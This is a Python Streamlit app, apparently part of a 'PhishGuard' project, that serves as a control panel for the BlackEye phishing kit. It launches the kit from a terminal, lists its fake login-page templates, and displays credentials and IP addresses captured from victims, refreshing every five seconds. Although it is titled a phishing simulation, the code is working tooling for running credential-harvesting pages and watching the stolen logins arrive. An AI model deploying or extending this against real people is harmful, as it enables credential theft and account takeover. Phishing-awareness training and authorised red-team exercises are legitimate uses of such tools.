import streamlit as st
import subprocess
import os
import time

BLACKEYE_PATH = "/home/kali/Downloads/PhishGuard/BlackEye-Python/"
LOG_FOLDER = os.path.join(BLACKEYE_PATH, "sites/")

def run_blackeye():
    """Launch Blackeye in a normal terminal."""
    st.write("🚀 Opening a terminal to run Blackeye...")
    
    if os.name == "posix":  # Linux/macOS
        subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c 'cd {BLACKEYE_PATH} && python3 main.py; exec bash'"])
    elif os.name == "nt":  # Windows
        subprocess.Popen(["cmd.exe", "/c", f"cd /d {BLACKEYE_PATH} && python main.py && pause"], shell=True)
    else:
        st.error("❌ Unsupported OS!")

def get_available_sites():
    """List all phishing sites in Blackeye's log folder."""
    return [d for d in os.listdir(LOG_FOLDER) if os.path.isdir(os.path.join(LOG_FOLDER, d))]

def get_latest_logs(log_file):
    """Read the latest lines from a log file."""
    if not os.path.exists(log_file):
        return ["No data available yet."]
    with open(log_file, "r") as file:
        logs = file.readlines()
    return logs[-5:] if logs else ["No data available yet."]

# Streamlit UI
st.title("🕵️ Blackeye Phishing Simulation")

if st.button("Run Blackeye"):
    run_blackeye()

# Let user select a phishing site from available sites
available_sites = get_available_sites()
if available_sites:
    selected_site = st.selectbox("📂 Select Phishing Site:", available_sites)

    if selected_site:
        IP_LOG_FILE = os.path.join(LOG_FOLDER, selected_site, "ip.txt")
        CREDENTIALS_FILE = os.path.join(LOG_FOLDER, selected_site, "usernames.txt")

        st.subheader(f"🌍 Captured IPs for {selected_site.capitalize()}")
        st.text("\n".join(get_latest_logs(IP_LOG_FILE)))

        st.subheader(f"🔑 Captured Credentials for {selected_site.capitalize()}")
        st.text("\n".join(get_latest_logs(CREDENTIALS_FILE)))

        # Auto-refresh logs every 5 seconds using st.rerun()
        time.sleep(5)
        st.rerun()
else:
    st.warning("⚠️ No phishing sites detected. Run Blackeye first!")
